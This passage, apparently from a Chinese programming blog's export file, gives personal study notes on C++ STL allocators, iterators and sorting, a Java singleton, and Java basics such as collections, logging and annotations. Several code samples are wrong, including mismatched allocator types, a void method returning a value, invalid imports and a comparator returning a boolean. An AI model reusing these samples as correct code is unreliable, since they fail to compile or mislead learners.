<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>, allocator&lt;string&gt;&gt; vec;  <span class="comment">// 默认分配器 在 &lt;memory&gt;</span></span><br><span class="line">vector&lt;<span class="type">int</span>, __gnu_cxx::malloc_allocator&lt;string&gt;&gt; vec; <span class="comment">// &lt;ext\...&gt;  &lt;ext\malloc_allocator.h&gt;</span></span><br><span class="line">vector&lt;<span class="type">int</span>, __gnu_cxx::new_allocator&lt;string&gt;&gt; vec;  </span><br><span class="line">vector&lt;<span class="type">int</span>, __gnu_cxx::bitmap_allocator&lt;string&gt;&gt; vec;  </span><br><span class="line">vector&lt;<span class="type">int</span>, __gnu_cxx::array_allocator&lt;string&gt;&gt; vec;  </span><br><span class="line">vector&lt;<span class="type">int</span>, __gnu_cxx::debug_allocator&lt;string&gt;&gt; vec;  </span><br><span class="line">vector&lt;<span class="type">int</span>, __gnu_cxx::__pool_alloc&lt;string&gt;&gt; vec;  <span class="comment">// 内存池</span></span><br><span class="line">vector&lt;<span class="type">int</span>, __gnu_cxx::__mt_alloc&lt;string&gt;&gt; vec;  <span class="comment">// 多线程</span></span><br></pre></td></tr></table></figure>

<p>使用分配器</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> *p;</span><br><span class="line">allocator&lt;<span class="type">int</span>&gt; ac;</span><br><span class="line">p = ac.<span class="built_in">allocate</span>(<span class="number">1</span>); <span class="comment">// 分配内存 1个int</span></span><br><span class="line">ac.<span class="built_in">deallocate</span>(p, <span class="number">1</span>); <span class="comment">// 释放内存</span></span><br></pre></td></tr></table></figure>

<h3 id="New-与-Malloc"><a href="#New-与-Malloc" class="headerlink" title="New 与 Malloc"></a>New 与 Malloc</h3><p>allocate 底层调用 operator new。<br>deallocate 底层调用 delete。<br>new 底层调用 malloc。<br>delete 底层调用 free。<br>malloc 不只分配了需要的内存，还有Debug信息，填充字节，上下边界符号等。<br>在VC6+，BC5中，allocator 中只使用new和delete，没有其他特殊设计。也就是，分配的只有指针，外部开销巨大（每个指针还要malloc，而每个malloc自带信息就已经远大于指针的大小了）。<br>在GNU2.9中，并未使用STL标准规定的分配器（&lt;defalloc.h&gt;没有特殊设计），而使用的是alloc分配器&lt;stl_alloc.h&gt;。这种优势在于，外部开销小（malloc次数很少）。容器的元素大小会被调整到8的倍数，然后malloc一大块内存，再进行切分。<br>在GNU4.9中，使用了<code>__gnu_cxx::new_allocator</code>，也就是VC6+一样的分配器。而原来的分配器改为__pool_alloc。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>* p = <span class="built_in">allocator</span>&lt;<span class="type">int</span>&gt;().<span class="built_in">allocate</span>(<span class="number">512</span>, (<span class="type">int</span>*)<span class="number">0</span>);</span><br><span class="line"><span class="built_in">allocator</span>&lt;<span class="type">int</span>&gt;().<span class="built_in">deallocate</span>(p, <span class="number">512</span>);</span><br></pre></td></tr></table></figure>

<h2 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h2><p>迭代器遵循的原则（为算法提供的属性）：</p>
<ul>
<li>分类</li>
<li>距离</li>
<li>值</li>
<li>引用（未使用）</li>
<li>指针（未使用）</li>
</ul>
<p>算法为了了解使用的迭代器的功能，需要通过 Iterator Trais 来获取迭代器的五种属性。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typename</span> iterator_trais&lt;RandomAccessIterator&gt;::<span class="built_in">iterator_category</span>(); <span class="comment">// 获取迭代器所属分类 </span></span><br></pre></td></tr></table></figure>

<p>迭代器分类：随机访问迭代器，双向链表迭代器</p>
<p>RandomAccessIterator  可加减乘除运算<br>List 不用 RandomAccessIterator 而是 ListIterator</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">list&lt;<span class="type">int</span>&gt;::iterator ite;</span><br><span class="line">(*ite).<span class="built_in">method</span>();</span><br><span class="line">ite-&gt;<span class="built_in">method</span>();</span><br><span class="line">ite++; ++ite;</span><br><span class="line">ite--; --ite;</span><br></pre></td></tr></table></figure>

<p>注：Trais 分6类：type，iterator，char，allocator，pointer，array。</p>
<h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><h3 id="比较大小"><a href="#比较大小" class="headerlink" title="比较大小"></a>比较大小</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">equal_to</span>&lt;T&gt;();</span><br><span class="line"><span class="built_in">not_equal_to</span>&lt;T&gt;();</span><br><span class="line"><span class="built_in">greater</span>&lt;T&gt;();</span><br><span class="line"><span class="built_in">greater_equal</span>&lt;T&gt;();</span><br><span class="line"><span class="built_in">less</span>&lt;T&gt;();</span><br><span class="line"><span class="built_in">less_equal</span>&lt;T&gt;();</span><br></pre></td></tr></table></figure>

<h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">compare_function</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;<span class="keyword">return</span> a&lt;b;&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">sort</span>(a.<span class="built_in">begin</span>(), a.<span class="built_in">end</span>());  <span class="comment">// 使用RandomAccessIterator迭代器排序</span></span><br><span class="line"><span class="built_in">sort</span>(a.<span class="built_in">begin</span>(), a.<span class="built_in">end</span>(), compare_function);  <span class="comment">// 自定义排序函数</span></span><br><span class="line"><span class="built_in">stable_sort</span>(); </span><br><span class="line"><span class="built_in">is_sorted</span>();</span><br><span class="line"><span class="built_in">partition</span>(); <span class="comment">// 符合条件的元素放在前面</span></span><br><span class="line"><span class="built_in">stable_partition</span>();</span><br><span class="line"><span class="built_in">qsort</span>(&amp;a[<span class="number">0</span>], <span class="number">20</span>, <span class="built_in">sizeof</span>(a[<span class="number">0</span>]), compare_function); <span class="comment">// 使用指针排序</span></span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>STL</tag>
        <tag>标准库</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式</title>
    <url>/2021/08/21/Java/DesignPattern/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>


<h2 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h2><p>特点：启动程序的时候就实例化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Single</span> &#123;</span><br><span class="line">    <span class="comment">// 屏蔽构造器</span></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Single</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">    <span class="comment">// 创建单一实例</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Single</span> <span class="variable">single</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Single</span>();</span><br><span class="line">    <span class="comment">// 创建获取器</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Single <span class="title function_">getSingle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> single;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>特点：第一次使用时再实例化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Single</span> &#123;</span><br><span class="line">    <span class="comment">// 屏蔽构造器</span></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Single</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">    <span class="comment">// 创建单一实例</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Single</span> <span class="variable">single</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 创建获取器</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Single <span class="title function_">getSingle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (single == <span class="literal">null</span>) &#123;</span><br><span class="line">            single = <span class="keyword">new</span> <span class="title class_">Single</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> single;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>Java</title>
    <url>/2021/08/21/Java/Java/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<h1 id="Java-版本"><a href="#Java-版本" class="headerlink" title="Java 版本"></a>Java 版本</h1><p>JavaSE：标准版，桌面应用。<br>JavaEE：企业版。<br>JavaME：微系统版，嵌入式。</p>
<h1 id="JDK"><a href="#JDK" class="headerlink" title="JDK"></a>JDK</h1><p>解压缩JDK，配置环境变量。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">JAVA_HOME=/path/to/jdk</span><br><span class="line"><span class="comment"># jdk 1.6 之后不需要 CLASSPATH</span></span><br><span class="line">CLASSPATH=.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</span><br><span class="line"><span class="comment"># 更新PATH</span></span><br><span class="line">PATH=PATH;%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin;</span><br></pre></td></tr></table></figure>

<h1 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="comment">// 可变参数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span>... x)</span>&#123;</span><br><span class="line">        <span class="type">int</span> r=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;x.length; ++i)&#123;</span><br><span class="line">            r+=x[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="说明注释"><a href="#说明注释" class="headerlink" title="说明注释"></a>说明注释</h1><p>说明注释，以 &#x2F;** 开始，以 *&#x2F;结束。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@author</span>  标识一个类的作者</span><br><span class="line">&#123;<span class="meta">@inheritDoc</span>&#125;    从直接父类继承的注释</span><br><span class="line"><span class="meta">@version</span>    指定类的版本</span><br><span class="line"></span><br><span class="line"><span class="meta">@param</span>    说明一个方法的参数</span><br><span class="line"><span class="meta">@return</span>    说明返回值类型</span><br><span class="line"><span class="meta">@serial</span>    说明一个序列化属性</span><br><span class="line"><span class="meta">@exception</span>    标志一个类抛出的异常</span><br><span class="line"><span class="meta">@throws</span>    和 <span class="meta">@exception</span>标签一样</span><br><span class="line">&#123;<span class="meta">@value</span>&#125;    显示常量的值，该常量必须是<span class="keyword">static</span>属性。</span><br></pre></td></tr></table></figure>

<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 声明</span></span><br><span class="line"><span class="type">int</span> arr[];</span><br><span class="line"><span class="type">int</span>[] arr;</span><br><span class="line"><span class="comment">// 分配空间</span></span><br><span class="line"><span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">4</span>];</span><br><span class="line"><span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>[][] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">32</span>][<span class="number">32</span>];</span><br><span class="line"><span class="type">int</span>[][] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">32</span>][];</span><br><span class="line"><span class="type">int</span>[][] arr = <span class="keyword">new</span> <span class="title class_">int</span>[][]&#123;</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">2</span>&#125;,</span><br><span class="line">    &#123;<span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line">arr.length;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 异常</span></span><br><span class="line">ArrayIndexOutOfBoundsException <span class="comment">// 数组越界</span></span><br><span class="line">NullPointerException <span class="comment">// 空指针</span></span><br></pre></td></tr></table></figure>

<h1 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h1><h2 id="List"><a href="#List" class="headerlink" title="List"></a>List</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LinkedList</span><br><span class="line">ArrayList</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">add(e)</span><br><span class="line">add(index, e)</span><br><span class="line">remove(index)</span><br><span class="line">remove(e)</span><br><span class="line">get(index)</span><br><span class="line">size()</span><br><span class="line">toArray()</span><br><span class="line"></span><br><span class="line"><span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> Arrays.asList() <span class="comment">// 只读</span></span><br></pre></td></tr></table></figure>

<h2 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap</span><br><span class="line">SortedMap #</span><br><span class="line">TreeMap</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">put(k, v)</span><br><span class="line">get(k)</span><br><span class="line">containsKey(k)</span><br><span class="line">keySet() <span class="comment">// for(String key: map.keySet())</span></span><br><span class="line">entrySet() <span class="comment">// for(Map.Entry&lt;String, Object&gt; key: map.entrySet())</span></span><br></pre></td></tr></table></figure>

<p>setting.properties 配置文件，不支持中文</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Properties</span> <span class="variable">props</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">props.load(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filepath));</span><br><span class="line"><span class="comment">// props.load(getClass().getResourceAsStream(&quot;/...&quot;));</span></span><br><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> props.getProperties(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;default url&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashSet</span><br><span class="line">SortedSet #</span><br><span class="line">TreeSet</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">add(e)</span><br><span class="line">remove(e)</span><br><span class="line">contains(e)</span><br><span class="line">size()</span><br></pre></td></tr></table></figure>

<p>自定义排序非法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TreeSet&lt;Student&gt; ts = <span class="keyword">new</span> <span class="title class_">TreeSet</span>&lt;Student&gt;(<span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;Student&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Student s1, Student s2)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> s1 &gt; s2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="Queue"><a href="#Queue" class="headerlink" title="Queue"></a>Queue</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Queue</span><br><span class="line">Priority</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">size()</span><br><span class="line">isEmpty()</span><br><span class="line"><span class="comment">// 抛出异常</span></span><br><span class="line">add()</span><br><span class="line">remove()</span><br><span class="line">element()</span><br><span class="line"><span class="comment">// 返回null或false</span></span><br><span class="line">offer()</span><br><span class="line">poll()</span><br><span class="line">peek()</span><br></pre></td></tr></table></figure>

<h2 id="Deque"><a href="#Deque" class="headerlink" title="Deque"></a>Deque</h2><p>底层</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LinkedList</span><br><span class="line">ArrayList</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">size()</span><br><span class="line">isEmpty()</span><br><span class="line"><span class="comment">// 抛出异常</span></span><br><span class="line">addLast()</span><br><span class="line">addFirst()</span><br><span class="line">removeFirst()</span><br><span class="line">removeLast()</span><br><span class="line">elementFirst()</span><br><span class="line">elementLast()</span><br><span class="line"><span class="comment">// 返回null或false</span></span><br><span class="line">offerLast()</span><br><span class="line">offerFirst()</span><br><span class="line">pollFirst()</span><br><span class="line">pollLast()</span><br><span class="line">peekFirst()</span><br><span class="line">peekLast()</span><br></pre></td></tr></table></figure>

<h2 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h2><p>不要使用遗留类Stack，而是使用Deque实现Stack</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">push()</span><br><span class="line">peek()</span><br><span class="line">pop()</span><br><span class="line">isEmpty()</span><br></pre></td></tr></table></figure>

<h2 id="Iterator"><a href="#Iterator" class="headerlink" title="Iterator"></a>Iterator</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">list.iterator()</span><br><span class="line">hasNext()</span><br><span class="line">next()</span><br></pre></td></tr></table></figure>

<h2 id="Collections"><a href="#Collections" class="headerlink" title="Collections"></a>Collections</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">addAll</span><span class="params">(Collection&lt;? <span class="built_in">super</span> T&gt; c, T... elements)</span></span><br><span class="line">emptyList()</span><br><span class="line">emptyMap()</span><br><span class="line">emptySet()</span><br><span class="line">singleton()</span><br><span class="line">singletonList()</span><br><span class="line">singletonMap()</span><br><span class="line">sort(list)</span><br><span class="line">sort(list, Comparator&lt;&gt; c)</span><br><span class="line">shuffle(); <span class="comment">// 打乱顺序</span></span><br><span class="line">unmodifiableList()</span><br><span class="line">unmodifiableSet()</span><br><span class="line">unmodifiableMap()</span><br><span class="line"><span class="comment">// 不推荐使用</span></span><br><span class="line">synchronizedList()</span><br><span class="line">synchronizedSet()</span><br><span class="line">synchronizedMap()</span><br></pre></td></tr></table></figure>

<h1 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取年龄</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> age</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Animal</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Animal</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Animal</span>().getAge();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="包"><a href="#包" class="headerlink" title="包"></a>包</h1><p>自定义包，包名要与路径名一样。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> base.animal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Animal;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ./base/animal/Cat.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cat</span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang;  <span class="comment">// String System Math ...</span></span><br><span class="line"><span class="keyword">import</span> java.net;   <span class="comment">// 网络</span></span><br><span class="line"><span class="keyword">import</span> java.io;    <span class="comment">// 输入输出</span></span><br><span class="line"><span class="keyword">import</span> java.util;  <span class="comment">// 实用工具，日期相关</span></span><br><span class="line"><span class="keyword">import</span> java.text;  <span class="comment">// 格式化</span></span><br><span class="line"><span class="keyword">import</span> java.sql;   <span class="comment">// dbc相关</span></span><br><span class="line"><span class="keyword">import</span> java.awt;   <span class="comment">// 抽象窗口程序集</span></span><br><span class="line"><span class="keyword">import</span> java.applet;<span class="comment">// applet相关</span></span><br></pre></td></tr></table></figure>

<h1 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span></span><br><span class="line"><span class="keyword">final</span> </span><br><span class="line"><span class="keyword">synchronized</span></span><br><span class="line"><span class="keyword">abstract</span></span><br><span class="line"><span class="keyword">native</span> </span><br></pre></td></tr></table></figure>

<h1 id="JavaBean"><a href="#JavaBean" class="headerlink" title="JavaBean"></a>JavaBean</h1><p>一种可重用组件：</p>
<ul>
<li>public 属性</li>
<li>有一个公共的无参构造器</li>
<li>有属性，有 get set 方法</li>
</ul>
<h1 id="实例化过程"><a href="#实例化过程" class="headerlink" title="实例化过程"></a>实例化过程</h1><ol>
<li>方法区：</li>
</ol>
<ul>
<li>加载类</li>
</ul>
<ol start="2">
<li>栈区：</li>
</ol>
<ul>
<li>申请变量空间</li>
</ul>
<ol start="3">
<li>堆区：</li>
</ol>
<ul>
<li>开辟堆空间</li>
<li>属性默认初始化</li>
<li>成员变量显示初始化</li>
</ul>
<ol start="4">
<li>栈区：</li>
</ol>
<ul>
<li>调用构造函数初始化</li>
<li>堆地址赋值给引用变量</li>
<li>构造函数出栈</li>
</ul>
<h1 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h1><p>方法的重载和重写。</p>
<p>对象的多态性：子类对父类覆盖，包括抽象类，接口。</p>
<p>编译时的（声明的）类型与运行时的（存储的）类型不一致，就出现多态。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 动态绑定</span></span><br><span class="line"><span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">p.getInfo();  <span class="comment">// 调用Student的方法</span></span><br></pre></td></tr></table></figure>

<p>查看类型：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">p <span class="keyword">instanceof</span> Person;  <span class="comment">// True 否则编译错误</span></span><br><span class="line">p <span class="keyword">instanceof</span> Student; <span class="comment">// True 否则编译错误</span></span><br></pre></td></tr></table></figure>

<h1 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h1><p>主要方法：</p>
<ul>
<li>equals</li>
<li>hashCode</li>
<li>toString</li>
</ul>
<p><code>==</code>只有指向同一对象，类型匹配时才为True。</p>
<p>equals比较是否指向同一个对象，但是在File，Date，String以及包装类（Integer，Float之类）这些，是比较对象的内容，而不考虑是否是同一个对象。</p>
<h1 id="包装类"><a href="#包装类" class="headerlink" title="包装类"></a>包装类</h1><p>JDK 1.5后支持自动拆箱，装箱。</p>
<p>装箱：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">10</span>);</span><br></pre></td></tr></table></figure>

<p>拆箱：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> i.intValue();</span><br></pre></td></tr></table></figure>

<h1 id="初始化块"><a href="#初始化块" class="headerlink" title="初始化块"></a>初始化块</h1><p>程序初始化顺序：</p>
<ol>
<li>声明成员变量，默认初始化。</li>
<li>显式初始化，执行初始化块。</li>
<li>调用构造器，初始化变量。</li>
</ol>
<p>静态初始化代码块优先于非静态代码块。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Logger"><a href="#Logger" class="headerlink" title="Logger"></a>Logger</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> Logger.getGlobal();</span><br><span class="line">logger.info();</span><br><span class="line">logger.log(Level.WARNING, <span class="string">&quot;&quot;</span>);</span><br><span class="line">logger.warning();</span><br></pre></td></tr></table></figure>

<p>级别</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">SEVERE</span><br><span class="line">WARNING</span><br><span class="line">INFO <span class="comment">// Default</span></span><br><span class="line">CONFIG</span><br><span class="line">FINE</span><br><span class="line">FINER</span><br><span class="line">FINEST</span><br></pre></td></tr></table></figure>

<p>配置文件需要通过启动参数传递。</p>
<p>commons logging 是 Apache 创建的日志模块，可以自动挂载Log4j或JDK Logging。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Log</span> <span class="variable">log</span> <span class="operator">=</span> LogFactory.getLog(Main.class);</span><br><span class="line">log.info();</span><br><span class="line">log.warn();</span><br></pre></td></tr></table></figure>

<p>级别</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">FATAL</span><br><span class="line">ERROR</span><br><span class="line">WARNING</span><br><span class="line">INFO <span class="comment">// Default</span></span><br><span class="line">DEBUG</span><br><span class="line">TRACE</span><br></pre></td></tr></table></figure>

<p>LOG4J 分为 1x 2x</p>
<ul>
<li>可以将日志输出到Console，File，Socket。</li>
<li>可以使用Layout格式化输出</li>
<li>使用Filter过滤要输出的内容</li>
</ul>
<p>配置文件 - 需设置 <code>log4j.xml</code></p>
<h1 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Pair</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Pair</span><span class="params">(Class&lt;T&gt; clazz)</span>&#123;</span><br><span class="line">        <span class="type">T</span> <span class="variable">c</span> <span class="operator">=</span> clazz.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;? <span class="keyword">extends</span> <span class="title class_">Number</span>&gt;</span><br><span class="line">&lt;? <span class="built_in">super</span> Number&gt;</span><br></pre></td></tr></table></figure>

<h1 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 内置注解</span></span><br><span class="line"><span class="comment">// 重写</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="comment">// 弃用</span></span><br><span class="line"><span class="meta">@Deprecated</span></span><br><span class="line"><span class="comment">// 镇压警告</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;all&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 元注解</span></span><br><span class="line"><span class="comment">// 可以用的范围   类，方法</span></span><br><span class="line"><span class="meta">@Target</span></span><br><span class="line"><span class="comment">// 何时使用注解  Runtime</span></span><br><span class="line"><span class="meta">@Retention</span></span><br><span class="line"><span class="comment">// 是否包含在文档</span></span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="comment">// 表示可以继承父类注解</span></span><br><span class="line"><span class="meta">@Inherited</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例</span></span><br><span class="line"><span class="meta">@Inherited</span></span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Retention(value = RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(value = &#123;ElementType.METHOD, ElementType.TYPE&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> MyAnno &#123;</span><br><span class="line">    String <span class="title function_">name</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">age</span><span class="params">()</span> <span class="keyword">default</span> <span class="number">0</span>;</span><br><span class="line">    String[] phones;</span><br><span class="line">    String <span class="title function_">value</span><span class="params">()</span>; <span class="comment">// 只有value可以省略</span></span><br><span 